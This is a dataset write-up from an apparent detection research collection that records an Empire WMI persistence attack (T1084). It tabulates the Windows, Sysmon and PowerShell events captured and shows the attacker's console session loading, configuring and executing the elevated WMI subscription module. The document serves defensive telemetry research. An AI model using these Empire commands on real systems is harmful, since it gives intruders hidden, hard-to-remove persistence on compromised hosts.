# Empire Elevated WMI Subscription

Persist a stager (or script) using a permanent WMI subscription.

## Technique(s) ID

T1084

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_elevated_wmi.tar.gz](./empire_elevated_wmi.tar.gz)

## Network Environment

Shire

## Time Taken

2019-05-18184306

## About this file

| log_name                                   | source_name                         | task                                                        |   record_number |
|--------------------------------------------|-------------------------------------|-------------------------------------------------------------|-----------------|
| Windows PowerShell                         | PowerShell                          | Pipeline Execution Details                                  |             259 |
| Security                                   | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                                 |             198 |
| Security                                   | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                               |             114 |
| Security                                   | Microsoft-Windows-Security-Auditing | Registry                                                    |              24 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logon                                                       |              20 |
| Security                                   | Microsoft-Windows-Security-Auditing | Group Membership                                            |              16 |
| Security                                   | Microsoft-Windows-Security-Auditing | Detailed File Share                                         |              14 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logoff                                                      |              14 |
| Security                                   | Microsoft-Windows-Security-Auditing | Special Logon                                               |              13 |
| Security                                   | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                     |               8 |
| Security                                   | Microsoft-Windows-Security-Auditing | Handle Manipulation                                         |               6 |
| Security                                   | Microsoft-Windows-Security-Auditing | Authorization Policy Change                                 |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Creation                                            |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | Kerberos Service Ticket Operations                          |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | File Share                                                  |               1 |
| Microsoft-Windows-WMI-Activity/Operational | Microsoft-Windows-WMI-Activity      | na                                                          |              47 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                      |            1678 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                              |             192 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)          |             100 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent)      |              92 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                            |              22 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                             |              14 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)                    |              13 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | RawAccessRead detected (rule: RawAccessRead)                |               8 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                        |               4 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | WmiEventConsumer activity detected (rule: WmiEvent)         |               1 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | WmiEventConsumerToFilter activity detected (rule: WmiEvent) |               1 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | WmiEventFilter activity detected (rule: WmiEvent)           |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Executing Pipeline                                          |             218 |

## Attacker Activity

```
(Empire: TKV35P8X) > usemodule persistence/elevated/wmi*
(Empire: powershell/persistence/elevated/wmi) > info

              Name: Invoke-WMI
            Module: powershell/persistence/elevated/wmi
        NeedsAdmin: True
         OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
   OutputExtension: None

Authors:
  @mattifestation
  @harmj0y

Description:
  Persist a stager (or script) using a permanent WMI
  subscription. This has a difficult detection/removal rating.

Comments:
  https://github.com/mattifestation/PowerSploit/blob/master/Pe
  rsistence/Persistence.psm1

Options:

  Name        Required    Value                     Description
  ----        --------    -------                   -----------
  DailyTime   False                                 Daily time to trigger the script        
                                                    (HH:mm).                                
  ProxyCreds  False       default                   Proxy credentials                       
                                                    ([domain\]username:password) to use for 
                                                    request (default, none, or other).      
  ExtFile     False                                 Use an external file for the payload    
                                                    instead of a stager.                    
  Cleanup     False                                 Switch. Cleanup the trigger and any     
                                                    script from specified location.         
  Agent       True        TKV35P8X                  Agent to run module on.                 
  Listener    True                                  Listener to use.                        
  SubName     True        Updater                   Name to use for the event subscription. 
  Proxy       False       default                   Proxy to use for request (default, none,
                                                    or other).                              
  AtStartup   False       True                      Switch. Trigger script (within 5        
                                                    minutes) of system startup.             
  UserAgent   False       default                   User-agent string to use for the staging
                                                    request (default, none, or other).      
  FailedLogon False                                 Trigger script with a failed logon      
                                                    attempt from a specified user           

(Empire: powershell/persistence/elevated/wmi) > set Listener https
(Empire: powershell/persistence/elevated/wmi) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked TKV35P8X to run TASK_CMD_WAIT
[*] Agent TKV35P8X tasked with task ID 3
[*] Tasked agent TKV35P8X to run module powershell/persistence/elevated/wmi
(Empire: powershell/persistence/elevated/wmi) > WMI persistence established using listener https with OnStartup WMI subsubscription trigger.

(Empire: powershell/persistence/elevated/wmi) >
```